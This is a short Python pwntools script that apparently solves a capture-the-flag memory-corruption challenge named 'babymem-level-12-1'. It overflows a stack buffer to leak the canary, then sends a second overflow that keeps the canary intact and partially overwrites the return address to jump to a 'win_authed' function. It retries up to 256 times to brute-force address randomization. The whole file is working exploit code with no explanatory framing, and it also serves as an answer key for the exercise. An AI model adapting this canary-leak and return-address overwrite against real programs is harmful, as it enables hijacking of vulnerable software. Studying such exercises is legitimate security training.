from pwn import *


for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-12-1')
    proc.recvuntil(b'size: ')
    offset_to_canary_leak = 104
    proc.sendline(str(offset_to_canary_leak+1).encode())
    proc.recv()
    payload = b'aREPEATb' + b'B' * (offset_to_canary_leak+1-8)
    proc.sendline(payload)
    print(proc.recvuntil(b'B' * (offset_to_canary_leak+1-8)))
    canary = proc.recv(7).rjust(8, b'\x00')
    print(canary)

    canary_int = int.from_bytes(canary, "little")
    canary = hex(canary_int)
    print(f'{canary=}')

    print(proc.recvuntil(b'size: '))
    # offset to canary + 8(canary) + 8(rbp) + 2 bytes nibble (offset win_authed)
    size = offset_to_canary_leak + 16 + 2
    proc.sendline(str(size).encode())
    proc.recv()
    canary = int(canary[2:], 16)
    offset_win_authed = p16(0x1f74)
    payload = b'A' * offset_to_canary_leak + p64(canary) + b'A' * 8 + offset_win_authed
    proc.sendline(payload)
    try:
        r = proc.recv()
        if b'pwn' in r:
            print(r)
            break
    except EOFError:
        pass
    proc.close()
